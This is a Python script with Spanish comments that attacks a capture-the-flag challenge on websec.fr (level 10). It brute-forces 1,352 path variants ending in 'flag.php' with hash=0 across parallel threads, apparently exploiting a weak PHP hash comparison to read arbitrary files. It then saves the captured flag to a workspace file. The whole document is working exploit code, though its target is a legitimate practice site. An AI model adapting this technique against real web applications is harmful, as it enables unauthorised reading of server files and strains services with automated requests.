#!/usr/bin/env python3
import requests
import concurrent.futures
import itertools

url = "https://websec.fr/level10/index.php"

# Generar paths más inteligentes - solo letras/números simples
paths = []

# Dos letras antes
for c1 in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ":
    for c2 in "abcdefghijklmnopqrstuvwxyz":
        paths.append(f"{c1}{c2}flag.php")

print(f"Probando {len(paths)} paths en paralelo...")

def test_path(path):
    try:
        r = requests.get(url, params={"f": path, "hash": "0"}, timeout=3)
        
        if "WEBSEC{" in r.text:
            flag_start = r.text.find("WEBSEC{")
            flag_end = r.text.find("}", flag_start)
            if flag_end > flag_start:
                return (True, path, r.text[flag_start:flag_end+1])
        
        if "Permission denied" not in r.text and len(r.text) > 2000:
            return (False, path, "interesting")
    
    except:
        pass
    
    return (False, path, None)

# Ejecutar en paralelo
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    futures = {executor.submit(test_path, path): path for path in paths}
    
    for i, future in enumerate(concurrent.futures.as_completed(futures)):
        if i % 100 == 0:
            print(f"Completados: {i}/{len(paths)}")
        
        success, path, result = future.result()
        
        if success:
            print(f"\n¡¡¡FLAG!!!: {result}")
            print(f"Path: {path}")
            with open("/workspace/websec_level10/FLAG.txt", "w") as f:
                f.write(f"FLAG: {result}\nPath: {path}\n")
            break

print("\nBúsqueda completada.")